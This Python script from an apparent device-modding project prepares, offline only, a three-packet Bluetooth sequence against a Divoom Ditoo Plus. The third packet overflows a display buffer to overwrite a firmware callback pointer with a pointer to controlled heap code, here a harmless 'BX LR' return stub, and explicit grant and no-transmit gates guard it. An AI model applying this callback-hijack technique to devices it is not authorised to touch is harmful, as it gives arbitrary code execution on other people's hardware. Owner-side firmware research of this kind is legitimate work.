#!/usr/bin/env python3
"""Prepare and verify the one-use VRAM-6/7 returning-stage-0 live gate.

Offline only.  This module cannot open Bluetooth, invoke Windows, mutate firmware, or
transmit bytes.  It freezes one exact sequence for OPENDITOO-VRAM67-BXLR-001 and
fails closed against the four authoritative Tier-2/VRAM artifacts.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "host"))

from ditoo_candidate_codec import decode_candidate_normal, encode_candidate_normal
from ditoo_tier2_display_surface import build_report as build_display_report
from ditoo_tier2_placement import BRANCHES, FW, build_report as build_placement_report
from ditoo_tier2_trigger import build_report as build_trigger_report
from ditoo_vram3_execution_model import build_report as build_vram3_report

EXPERIMENT_ID = "OPENDITOO-VRAM67-BXLR-001"
GRANT_TEXT = "Grant OPENDITOO-VRAM67-BXLR-001 -- stock btplayer selected"
TARGET_MAC = "11:75:58:CE:DE:C7"
TARGET_RFCOMM_CHANNEL = 1
TARGET_VERSION = 42012

ARTIFACTS = {
    "tier2_display": ROOT / "artifacts/analysis/volatile_ram_api_tier2_display.json",
    "tier2_placement": ROOT / "artifacts/analysis/volatile_ram_api_tier2_placement.json",
    "tier2_trigger": ROOT / "artifacts/analysis/volatile_ram_api_tier2_trigger.json",
    "vram3_execution": ROOT / "artifacts/analysis/volatile_ram_api_vram3_execution.json",
}
ANALYZERS = {
    "tier2_display": build_display_report,
    "tier2_placement": build_placement_report,
    "tier2_trigger": build_trigger_report,
    "vram3_execution": build_vram3_report,
}
M4_RESULT = ROOT / "captures/OPENDITOO-DAY1-M4-LIVE-RESULT-2026-09-08.json"
PERIOD_APK = ROOT / "artifacts/apps/divoom_android_3.1.58.apk"
RUNTIME018_POLICY = ROOT / "product/OPENDITOO-PRODUCT-RUNTIME-018.json"

FIXTURE_DIR = ROOT / "experiments/fixtures"
SOURCE_FILE = FIXTURE_DIR / f"{EXPERIMENT_ID}-source.bin"
PRIME_FILE = FIXTURE_DIR / f"{EXPERIMENT_ID}-01-prime.bin"
SETUP_FILE = FIXTURE_DIR / f"{EXPERIMENT_ID}-02-voicetip.bin"
OVERWRITE_FILE = FIXTURE_DIR / f"{EXPERIMENT_ID}-03-overwrite.bin"
FIXTURE_REPORT = ROOT / "artifacts/analysis/volatile_ram_api_vram67_fixture.json"
MANIFEST = ROOT / f"experiments/{EXPERIMENT_ID}.json"

CONTROLLED_SOURCE_ADDRESS = 0x00804778
STAGE0_THUMB_ENTRY = 0x00804779
RUNTIME50_ADDRESS = 0x00804B80
RUNTIME50_CALLBACK_ADDRESS = 0x00804BB4
RUNTIME50_SOURCE_OFFSET = RUNTIME50_ADDRESS - CONTROLLED_SOURCE_ADDRESS
CALLBACK_SOURCE_OFFSET = RUNTIME50_CALLBACK_ADDRESS - CONTROLLED_SOURCE_ADDRESS
SOURCE_LENGTH = CALLBACK_SOURCE_OFFSET + 4
STAGE0_RETURN_BYTES = bytes.fromhex("7047")
RUNTIME50_BYTE0 = 0xFF
RUNTIME50_MODEL_OFFSET = 0x08
RUNTIME50_MODEL = 0x22
PRESERVED_RUNTIME50_OFFSETS = (0x3C, 0x40, 0x44)

# Frozen stock-shaped inputs.  Period-app v3.1.58's CmdManager uses:
# P0(true) -> 0x6e payload [1]; i0(true, 2, volume) -> 0xa5 payload
# [1,2,volume]; O0(frameCounter, source) -> 0x6c payload
# [frameCounter:u16le, sourceLength:u16le] + source.  The stock frame counter
# starts at zero.  Volume/caller_arg=1 is the smallest non-zero stock-shaped value.
PRIME_PAYLOAD = bytes([0x01])
VOICETIP_PAYLOAD = bytes([0x01, 0x02, 0x01])
FRAME_COUNTER = 0

# No arbitrary filler is promoted.  0xff is the already-proven benign byte0 path
# and matches the pristine reclaimed-stage-1 fill surrounding the 2-byte witness.
SOURCE_FILL = 0xFF

# One connection, three application frames, no responses required and no retry.
# 40 ms is the project's stock-observed conservative application-packet spacing.
INTER_PACKET_DELAY_MS = 40
# VoiceTip stores now + 0x3c in its +0x40 deadline.  Hold well beyond that
# 60-unit stock preview deadline before declaring the returning-path discriminator.
OBSERVATION_HOLD_MS = 75_000
CONNECT_BUDGET_MS = 15_000
TOTAL_BUDGET_MS = 92_000


def _sha_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _sha_path(path: Path) -> str:
    return _sha_bytes(path.read_bytes())


def _json(path: Path) -> dict[str, Any]:
    return json.loads(path.read_text(encoding="utf-8"))


def build_source() -> bytes:
    source = bytearray([SOURCE_FILL]) * SOURCE_LENGTH
    source[0:2] = STAGE0_RETURN_BYTES
    source[RUNTIME50_SOURCE_OFFSET] = RUNTIME50_BYTE0
    source[RUNTIME50_SOURCE_OFFSET + RUNTIME50_MODEL_OFFSET] = RUNTIME50_MODEL
    source[CALLBACK_SOURCE_OFFSET:CALLBACK_SOURCE_OFFSET + 4] = STAGE0_THUMB_ENTRY.to_bytes(4, "little")
    return bytes(source)


def build_packets() -> dict[str, bytes]:
    source = build_source()
    prime = encode_candidate_normal(0x6E, PRIME_PAYLOAD)
    setup = encode_candidate_normal(0xA5, VOICETIP_PAYLOAD)
    overwrite_payload = (
        FRAME_COUNTER.to_bytes(2, "little")
        + SOURCE_LENGTH.to_bytes(2, "little")
        + source
    )
    overwrite = encode_candidate_normal(0x6C, overwrite_payload)
    return {"source": source, "prime": prime, "voicetip": setup, "overwrite": overwrite}


def _require(cond: bool, message: str) -> None:
    if not cond:
        raise ValueError(message)


def _verify_authoritative_artifacts() -> dict[str, Any]:
    reports: dict[str, Any] = {}
    hashes: dict[str, str] = {}
    for name, path in ARTIFACTS.items():
        committed = _json(path)
        live = ANALYZERS[name]()
        _require(committed == live, f"{name}: committed artifact drift")
        reports[name] = committed
        hashes[name] = _sha_path(path)

    display = reports["tier2_display"]
    placement = reports["tier2_placement"]
    trigger = reports["tier2_trigger"]
    vram3 = reports["vram3_execution"]

    reach = display["reachability"]
    _require(reach["prime_command"] == "0x6e SPP_DRAWING_CTRL_MOVIE_PLAY", "prime command drift")
    _require(reach["prime_control"] == "payload[1] != 0", "prime control drift")
    _require(reach["stock_mode"] == "0x0b", "content mode drift")
    _require(reach["copy_command"] == "0x6c SPP_DRAWING_ENCODE_MOVIE_PLAY", "copy command drift")
    _require(reach["copy_precondition"] == "content mode 0x0b already selected; 0x6c does not prime itself", "copy precondition drift")
    _require(display["placement_integration"]["display_data_pointer"] == hex(CONTROLLED_SOURCE_ADDRESS), "controlled destination drift")

    gate = placement["placement_gate"]["runtime50_candidate"]
    _require(gate["base"] == hex(RUNTIME50_ADDRESS), "runtime50 base drift")
    _require(gate["callback"] == hex(RUNTIME50_CALLBACK_ADDRESS), "runtime50 callback drift")
    _require(gate["callback_source_offset"] == CALLBACK_SOURCE_OFFSET, "callback source offset drift")
    _require(gate["minimum_source_length_to_fully_control_callback"] == SOURCE_LENGTH, "source length drift")

    witness = trigger["overwrite_witness"]
    _require(witness["source_address"] == hex(CONTROLLED_SOURCE_ADDRESS), "trigger source drift")
    _require(witness["exact_source_length"] == SOURCE_LENGTH, "trigger exact length drift")
    _require(witness["runtime50_source_offset"] == RUNTIME50_SOURCE_OFFSET, "runtime50 source offset drift")
    _require(witness["callback_source_offset"] == CALLBACK_SOURCE_OFFSET, "trigger callback offset drift")
    _require(witness["controlled_runtime50_byte0"] == hex(RUNTIME50_BYTE0), "runtime50 byte0 drift")
    _require(witness["controlled_runtime50_byte8_model"] == hex(RUNTIME50_MODEL), "runtime50 model drift")
    _require(witness["controlled_callback_value"] == hex(STAGE0_THUMB_ENTRY), "callback target drift")
    _require(witness["last_overwritten_runtime50_offset"] == "0x37", "overwrite endpoint drift")
    _require(tuple(int(v, 16) for v in witness["preserved_runtime50_offsets"]) == PRESERVED_RUNTIME50_OFFSETS, "preserved runtime50 offsets drift")
    stage0 = trigger["stage0_witness"]
    _require(stage0["bytes_hex"] == STAGE0_RETURN_BYTES.hex() and stage0["instruction"] == "BX LR", "returning stage0 drift")
    _require(trigger["promotion"]["remaining_before_any_live_stage0"] == "REVIEWED_ONE_USE_LIVE_MANIFEST_AND_EXPLICIT_GRANT", "live boundary drift")

    _require(vram3["execution_model"]["heap_executable_by_mapping_model"] is True, "heap executable model drift")
    _require(vram3["scratch_model"]["stage0_source"] == hex(CONTROLLED_SOURCE_ADDRESS), "VRAM3 source drift")
    _require(vram3["scratch_model"]["stage0_entry"] == hex(STAGE0_THUMB_ENTRY), "VRAM3 entry drift")
    _require(vram3["scratch_model"]["stage0_return_bytes_hex"] == STAGE0_RETURN_BYTES.hex(), "VRAM3 BX LR drift")

    # Pin the common post-clock-read sequence used by Fwl_GetSecond: move raw tick
    # result to r1, synthesize 1000 in r0, divide, return.  The BLX veneer target
    # varies by branch, so only the semantic suffix is frozen here.
    second_suffix = bytes.fromhex("011c7d20c000fbf722e980bd")
    for branch, spec in BRANCHES.items():
        blob = (FW / spec["file"]).read_bytes()
        _require(blob[0xBDF8:0xBE04] == second_suffix, f"{branch}: seconds-clock suffix drift")

    return {"hashes": hashes, "reports": reports}


def _verify_exact_unit() -> dict[str, Any]:
    m4 = _json(M4_RESULT)
    _require(m4["status"] == "pass", "M4 exact-unit result no longer pass")
    _require(m4["target"]["address"] == TARGET_MAC, "M4 target MAC drift")
    _require(m4["target"]["rfcomm_channel"] == TARGET_RFCOMM_CHANNEL, "M4 RFCOMM channel drift")
    _require(m4["result"]["decoded_version"] == TARGET_VERSION, "M4 firmware version drift")
    _require(m4["operation"]["retry"] is False and m4["operation"]["requests_sent"] == 1, "M4 authority/result drift")
    return {"m4_result_sha256": _sha_path(M4_RESULT), "period_apk_sha256": _sha_path(PERIOD_APK), "runtime018_policy_sha256": _sha_path(RUNTIME018_POLICY)}


def build_report() -> dict[str, Any]:
    authority = _verify_authoritative_artifacts()
    exact = _verify_exact_unit()
    packets = build_packets()

    # Decode every application packet offline and pin the stock-shaped payloads.
    prime = decode_candidate_normal(packets["prime"])
    setup = decode_candidate_normal(packets["voicetip"])
    overwrite = decode_candidate_normal(packets["overwrite"])
    _require((prime.command, prime.payload) == (0x6E, PRIME_PAYLOAD), "prime frame generation drift")
    _require((setup.command, setup.payload) == (0xA5, VOICETIP_PAYLOAD), "VoiceTip frame generation drift")
    _require(overwrite.command == 0x6C, "overwrite command drift")
    _require(overwrite.payload[:2] == b"\x00\x00", "frame counter drift")
    _require(int.from_bytes(overwrite.payload[2:4], "little") == SOURCE_LENGTH, "declared source length drift")
    _require(overwrite.payload[4:] == packets["source"], "overwrite source mismatch")

    source = packets["source"]
    _require(len(source) == SOURCE_LENGTH, "source length mismatch")
    _require(source[:2] == STAGE0_RETURN_BYTES, "stage0 bytes mismatch")
    _require(source[RUNTIME50_SOURCE_OFFSET] == RUNTIME50_BYTE0, "runtime50 byte0 mismatch")
    _require(source[RUNTIME50_SOURCE_OFFSET + RUNTIME50_MODEL_OFFSET] == RUNTIME50_MODEL, "runtime50 model mismatch")
    _require(int.from_bytes(source[CALLBACK_SOURCE_OFFSET:CALLBACK_SOURCE_OFFSET + 4], "little") == STAGE0_THUMB_ENTRY, "callback pointer mismatch")

    return {
        "schema_version": 1,
        "kind": "openditoo_vram67_returning_stage0_live_gate_fixture",
        "experiment_id": EXPERIMENT_ID,
        "ok": True,
        "safety": {
            "offline_preparation_only": True,
            "device_io": False,
            "bluetooth_opened": False,
            "packets_transmitted": 0,
            "firmware_mutation": False,
            "persistent_mutation": False,
            "loader_or_followon_payload": False,
            "generic_raw_packet_surface": False,
        },
        "authority_boundary": {
            "status": "STOP_BEFORE_TRANSMIT",
            "required_grant_text": GRANT_TEXT,
            "previous_grants_transfer": False,
        },
        "target": {
            "model": "Divoom Ditoo Plus",
            "purchased_unit_only": True,
            "mac": TARGET_MAC,
            "rfcomm_channel": TARGET_RFCOMM_CHANNEL,
            "installed_firmware_version_assumption": TARGET_VERSION,
            "identity_evidence": str(M4_RESULT.relative_to(ROOT)),
            **exact,
        },
        "authoritative_artifacts": {
            name: {"path": str(path.relative_to(ROOT)), "sha256": authority["hashes"][name]}
            for name, path in ARTIFACTS.items()
        },
        "preconditions": {
            "manual_stock_btplayer_required": True,
            "host_only_0x8a_normalization_promoted": False,
            "runtime018_must_be_suspended_before_claimed_runner_opens_rfcomm": True,
        },
        "sequence": [
            {"ordinal": 1, "class": "stock", "command": "0x6e", "role": "prime content mode 0x0b", "payload_hex": PRIME_PAYLOAD.hex()},
            {"ordinal": 2, "class": "stock", "command": "0xa5", "role": "VoiceTip setup", "payload_hex": VOICETIP_PAYLOAD.hex(), "selector": 2, "model": "0x22", "caller_arg": 1},
            {"ordinal": 3, "class": "custom_once", "command": "0x6c", "role": "exact adjacent overwrite", "frame_counter": FRAME_COUNTER, "declared_source_length": SOURCE_LENGTH},
        ],
        "stage0": {
            "source_address": hex(CONTROLLED_SOURCE_ADDRESS),
            "entry": hex(STAGE0_THUMB_ENTRY),
            "bytes_hex": STAGE0_RETURN_BYTES.hex(),
            "instruction": "BX LR",
            "source_length": SOURCE_LENGTH,
            "source_fill": hex(SOURCE_FILL),
            "runtime50_base": hex(RUNTIME50_ADDRESS),
            "runtime50_callback": hex(RUNTIME50_CALLBACK_ADDRESS),
            "runtime50_source_offset": RUNTIME50_SOURCE_OFFSET,
            "callback_source_offset": CALLBACK_SOURCE_OFFSET,
            "runtime50_byte0": hex(RUNTIME50_BYTE0),
            "runtime50_model_offset": hex(RUNTIME50_MODEL_OFFSET),
            "runtime50_model": hex(RUNTIME50_MODEL),
            "preserved_runtime50_offsets": [hex(v) for v in PRESERVED_RUNTIME50_OFFSETS],
            "last_overwritten_runtime50_offset": "0x37",
        },
        "fixtures": {
            "source": {"path": str(SOURCE_FILE.relative_to(ROOT)), "length": len(packets["source"]), "sha256": _sha_bytes(packets["source"])},
            "prime": {"path": str(PRIME_FILE.relative_to(ROOT)), "wire_length": len(packets["prime"]), "sha256": _sha_bytes(packets["prime"]), "wire_hex": packets["prime"].hex()},
            "voicetip": {"path": str(SETUP_FILE.relative_to(ROOT)), "wire_length": len(packets["voicetip"]), "sha256": _sha_bytes(packets["voicetip"]), "wire_hex": packets["voicetip"].hex()},
            "overwrite": {"path": str(OVERWRITE_FILE.relative_to(ROOT)), "wire_length": len(packets["overwrite"]), "sha256": _sha_bytes(packets["overwrite"]), "wire_prefix_hex": packets["overwrite"][:16].hex(), "wire_suffix_hex": packets["overwrite"][-16:].hex()},
        },
        "transport_budget": {
            "max_connections": 1,
            "exact_application_sends": 3,
            "max_custom_0x6c_sends": 1,
            "retry": False,
            "reconnect": False,
            "inter_packet_delay_ms": INTER_PACKET_DELAY_MS,
            "connect_budget_ms": CONNECT_BUDGET_MS,
            "observation_hold_ms_after_overwrite": OBSERVATION_HOLD_MS,
            "total_budget_ms": TOTAL_BUDGET_MS,
            "total_application_tx_bytes": len(packets["prime"]) + len(packets["voicetip"]) + len(packets["overwrite"]),
        },
        "success_discriminator": {
            "offline premise": "VoiceTip period-1 timeout deterministically reaches runtime50+0x34 after its stock deadline, and +0x34 is overwritten with 0x00804779.",
            "live_required": [
                "all three exact sends complete once on the single RFCOMM connection",
                "the RFCOMM connection remains alive through the full post-overwrite observation hold",
                "no crash, reboot, disconnect, or watchdog/reset symptom occurs",
                "after the experiment socket closes, accepted Runtime 018 is restored and reaches connected with no last_error",
            ],
            "interpretation": "PASS only when the frozen overwrite is known to have landed under the promoted trigger model and normal execution/liveness survives beyond the callback deadline. Crash, reboot, timeout, disconnect, or timing-only change is not success.",
        },
        "stop_policy": {
            "ambiguous_send": "STOP_NO_RETRY",
            "partial_send": "STOP_NO_RETRY",
            "connect_failure": "STOP_NO_RETRY",
            "disconnect_during_observation": "STOP_NO_RETRY_AND_RESTORE_RUNTIME018",
            "crash_or_reboot": "STOP_NO_RETRY_AND_RESTORE_RUNTIME018_IF_POSSIBLE",
            "success": "RESTORE_RUNTIME018_RECORD_RESULT_STOP_FOR_INTERPRETATION_BEFORE_VRAM8",
        },
    }


def write_fixtures_and_report() -> dict[str, Any]:
    report = build_report()
    packets = build_packets()
    FIXTURE_DIR.mkdir(parents=True, exist_ok=True)
    for path, key in ((SOURCE_FILE, "source"), (PRIME_FILE, "prime"), (SETUP_FILE, "voicetip"), (OVERWRITE_FILE, "overwrite")):
        path.write_bytes(packets[key])
    FIXTURE_REPORT.parent.mkdir(parents=True, exist_ok=True)
    FIXTURE_REPORT.write_text(json.dumps(report, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return report


def verify_committed() -> dict[str, Any]:
    live = build_report()
    committed = _json(FIXTURE_REPORT)
    _require(committed == live, "committed VRAM-6/7 fixture report drift")
    packets = build_packets()
    for path, key in ((SOURCE_FILE, "source"), (PRIME_FILE, "prime"), (SETUP_FILE, "voicetip"), (OVERWRITE_FILE, "overwrite")):
        _require(path.read_bytes() == packets[key], f"fixture drift: {path}")
    return live


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--write", action="store_true", help="write only the frozen offline fixtures/report")
    ap.add_argument("--selfcheck", action="store_true")
    ap.add_argument("--json", action="store_true")
    args = ap.parse_args()
    report = write_fixtures_and_report() if args.write else (verify_committed() if FIXTURE_REPORT.exists() else build_report())
    if args.selfcheck:
        print("DITOO_VRAM67_LIVE_GATE=PASS")
        print(f"VRAM67_EXPERIMENT_ID={EXPERIMENT_ID}")
        print(f"VRAM67_TARGET_VERSION={TARGET_VERSION}")
        print(f"VRAM67_SOURCE_LENGTH={SOURCE_LENGTH}")
        print(f"VRAM67_OVERWRITE_SHA256={report['fixtures']['overwrite']['sha256']}")
        print("VRAM67_APPLICATION_SENDS=3")
        print("VRAM67_CUSTOM_0X6C_SENDS=1")
        print("VRAM67_RETRY=false")
        print("VRAM67_AUTHORITY=STOP_BEFORE_TRANSMIT")
    if args.json:
        print(json.dumps(report, indent=2, sort_keys=True))
    if not (args.selfcheck or args.json or args.write):
        print("DITOO_VRAM67_LIVE_GATE=PASS")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
